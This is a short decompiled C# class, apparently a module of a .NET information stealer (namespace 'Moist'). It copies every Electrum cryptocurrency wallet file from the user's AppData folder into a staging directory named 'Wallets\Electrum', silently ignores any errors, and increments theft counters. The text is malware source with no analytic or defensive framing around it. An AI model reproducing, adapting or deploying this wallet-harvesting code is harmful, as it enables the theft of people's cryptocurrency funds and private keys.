using System;
using System.IO;
using Moist;

// Token: 0x0200005E RID: 94
internal class Class31
{
	// Token: 0x0600024F RID: 591 RVA: 0x00012CB4 File Offset: 0x00010EB4
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Electrum\\wallets").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class31.string_0);
				fileInfo.CopyTo(string_1 + Class31.string_0 + fileInfo.Name);
			}
			Class31.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000250 RID: 592 RVA: 0x0000446C File Offset: 0x0000266C
	public Class31()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000251 RID: 593 RVA: 0x00005288 File Offset: 0x00003488
	// Note: this type is marked as 'beforefieldinit'.
	static Class31()
	{
		Class40.gcO0h7LzslQIW();
		Class31.int_0 = 0;
		Class31.string_0 = "\\Wallets\\Electrum\\";
	}

	// Token: 0x0400010C RID: 268
	public static int int_0;

	// Token: 0x0400010D RID: 269
	public static string string_0;
}
